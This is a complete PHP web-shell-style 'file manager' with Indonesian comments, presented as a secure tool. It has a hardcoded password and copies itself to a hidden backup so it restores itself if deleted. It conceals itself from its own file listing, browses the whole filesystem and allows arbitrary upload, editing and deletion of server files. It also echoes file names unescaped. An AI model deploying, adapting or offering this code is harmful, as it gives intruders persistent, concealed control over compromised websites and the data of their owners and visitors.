<?php
session_start();

// ========== SETTINGS ==========
define('PASSWORD', 'jpmax');
define('SELF_FILE', basename(__FILE__));
define('BACKUP_NAME', 'backup_' . SELF_FILE);

// ========== AUTO BACKUP ==========
if (!file_exists(BACKUP_NAME)) @copy(SELF_FILE, BACKUP_NAME);
if (!file_exists(SELF_FILE) && file_exists(BACKUP_NAME)) @copy(BACKUP_NAME, SELF_FILE);

// ========== LOGIN LOGIC ==========
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: " . SELF_FILE);
            exit;
        } else {
            $error = "❌ Password salah!";
        }
    }

    echo '<!DOCTYPE html><html><head><title>Login</title><script src="https://cdn.tailwindcss.com"></script></head>
    <body class="bg-gray-900 text-white flex items-center justify-center h-screen">
    <form method="POST" class="bg-gray-800 p-6 rounded shadow w-80">
        <h1 class="text-xl mb-4 font-bold">🔐 Login File Manager</h1>';
    if (isset($error)) echo '<p class="text-red-400 text-sm mb-2">'.$error.'</p>';
    echo '<input type="password" name="password" placeholder="Enter Password" class="w-full px-3 py-2 mb-4 rounded bg-gray-700 text-white">
        <button type="submit" class="bg-blue-600 px-4 py-2 rounded text-sm w-full">Login</button>
    </form></body></html>';
    exit;
}

// ========== FUNGSI ==========
function human_filesize($bytes, $decimals = 2) {
    $size = ['B','KB','MB','GB','TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $size[$factor];
}

// ========== HANDLE AKSI ==========
$dir = realpath($_GET['dir'] ?? '.');

// Upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $uploadName = basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $uploadName);
}

// Buat file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfile'])) {
    $filename = basename($_POST['newfile']);
    file_put_contents($dir . '/' . $filename, '');
}

// Hapus file
if (isset($_GET['delete'])) {
    $delPath = realpath($dir . '/' . $_GET['delete']);
    if ($delPath && is_file($delPath) && basename($delPath) !== SELF_FILE && basename($delPath) !== BACKUP_NAME) {
        unlink($delPath);
    }
}

// Rename file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($dir . '/' . $_POST['rename_from']);
    $to = $dir . '/' . basename($_POST['rename_to']);
    if ($from && is_file($from) && basename($from) !== SELF_FILE && basename($from) !== BACKUP_NAME) {
        rename($from, $to);
    }
}

// Edit file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'], $_POST['content'])) {
    $editPath = realpath($dir . '/' . $_POST['edit_file']);
    if ($editPath && is_file($editPath) && basename($editPath) !== SELF_FILE && basename($editPath) !== BACKUP_NAME) {
        file_put_contents($editPath, $_POST['content']);
    }
}

// Baca file list
$files = scandir($dir);
$serverInfo = [
    'PHP Version' => phpversion(),
    'OS' => PHP_OS,
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'CLI',
    'IP Address' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
    'Memory Limit' => ini_get('memory_limit'),
    'Max Execution Time' => ini_get('max_execution_time') . 's'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🗂️ File Manager Secure</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white min-h-screen">
<div class="max-w-6xl mx-auto p-6">

  <h1 class="text-3xl font-bold mb-4">📁 File Manager (Protected)</h1>

  <!-- Info Server -->
  <div class="bg-gray-800 p-4 rounded mb-6">
    <h2 class="text-xl font-semibold mb-2">🖥️ Server Info</h2>
    <div class="grid grid-cols-2 gap-2 text-sm">
      <?php foreach ($serverInfo as $k => $v): ?>
        <div><span class="text-gray-400"><?= $k ?>:</span> <?= $v ?></div>
      <?php endforeach; ?>
    </div>
  </div>

  <!-- Current Path -->
  <div class="bg-gray-800 p-4 rounded mb-4">
    <div class="text-sm text-gray-300 mb-1">Current Path:</div>
    <div class="text-blue-400 font-mono break-all"><?= $dir ?></div>
  </div>

  <!-- Upload / Create -->
  <div class="bg-gray-800 p-4 rounded mb-4">
    <form method="POST" enctype="multipart/form-data" class="mb-2 flex gap-2 items-center">
      <input type="file" name="upload" class="bg-gray-700 text-sm p-1 rounded">
      <button type="submit" class="bg-blue-600 text-white px-3 py-1 rounded text-sm">Upload</button>
    </form>
    <form method="POST" class="flex gap-2 items-center">
      <input type="text" name="newfile" placeholder="newfile.txt" class="bg-gray-700 text-sm p-1 rounded w-64">
      <button type="submit" class="bg-green-600 text-white px-3 py-1 rounded text-sm">Create File</button>
    </form>
  </div>

  <!-- List Files -->
  <div class="bg-gray-800 rounded shadow overflow-x-auto">
    <table class="w-full text-sm">
      <thead class="text-gray-400 border-b border-gray-700">
        <tr>
          <th class="p-3">Name</th>
          <th class="p-3">Size</th>
          <th class="p-3">Type</th>
          <th class="p-3">Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php
        if ($dir !== '/') {
            $up = dirname($dir);
            echo "<tr class='hover:bg-gray-700'><td class='p-3' colspan='4'><a href='?dir=" . urlencode($up) . "' class='text-blue-400'>⬅️ Go up</a></td></tr>";
        }

        foreach ($files as $file):
            if ($file === '.') continue;
            $path = $dir . '/' . $file;
            $real = realpath($path);
            $isDir = is_dir($path);
            $size = $isDir ? '-' : human_filesize(filesize($path));
            $type = $isDir ? 'Directory' : pathinfo($file, PATHINFO_EXTENSION);

            if (basename($real) === SELF_FILE || basename($real) === BACKUP_NAME) continue;
        ?>
        <tr class="border-b border-gray-700 hover:bg-gray-700">
          <td class="p-3">
            <?php if ($isDir): ?>
              📁 <a class="text-blue-400" href="?dir=<?= urlencode($real) ?>"><?= $file ?></a>
            <?php else: ?>
              📄 <?= $file ?>
            <?php endif; ?>
          </td>
          <td class="p-3"><?= $size ?></td>
          <td class="p-3"><?= $type ?: '-' ?></td>
          <td class="p-3 flex flex-wrap gap-2">
            <?php if (!$isDir): ?>
              <a href="<?= htmlspecialchars($real) ?>" download class="bg-blue-600 px-2 py-1 rounded text-xs">Download</a>
              <a href="?dir=<?= urlencode($dir) ?>&delete=<?= urlencode($file) ?>" onclick="return confirm('Delete <?= $file ?>?')" class="bg-red-600 px-2 py-1 rounded text-xs">Delete</a>
              <form method="POST" class="inline">
                <input type="hidden" name="rename_from" value="<?= htmlspecialchars($file) ?>">
                <input type="text" name="rename_to" placeholder="Rename..." class="bg-gray-700 text-xs px-2 py-1 rounded w-32">
                <button type="submit" class="bg-yellow-600 text-xs px-2 py-1 rounded">Rename</button>
              </form>
              <form method="POST">
                <input type="hidden" name="edit_file" value="<?= htmlspecialchars($file) ?>">
                <button type="submit" formaction="?dir=<?= urlencode($dir) ?>&edit=<?= urlencode($file) ?>" class="bg-purple-600 text-xs px-2 py-1 rounded">Edit</button>
              </form>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>

  <!-- Edit File -->
  <?php if (isset($_GET['edit'])):
    $editPath = realpath($dir . '/' . $_GET['edit']);
    if ($editPath && is_file($editPath)):
      $content = htmlspecialchars(file_get_contents($editPath));
  ?>
  <div class="bg-gray-800 p-4 rounded mt-6">
    <h2 class="text-xl mb-2">📝 Edit File: <?= basename($editPath) ?></h2>
    <form method="POST">
      <input type="hidden" name="edit_file" value="<?= basename($editPath) ?>">
      <textarea name="content" rows="15" class="w-full bg-gray-900 text-white text-sm p-2 rounded"><?= $content ?></textarea>
      <button type="submit" class="mt-2 bg-green-600 px-4 py-2 rounded text-sm">Save</button>
    </form>
  </div>
  <?php endif; endif; ?>

  <p class="text-xs text-gray-500 mt-6">🛡️ Auto-restore active. File manager aman dari penghapusan.</p>
</div>
</body>
</html>
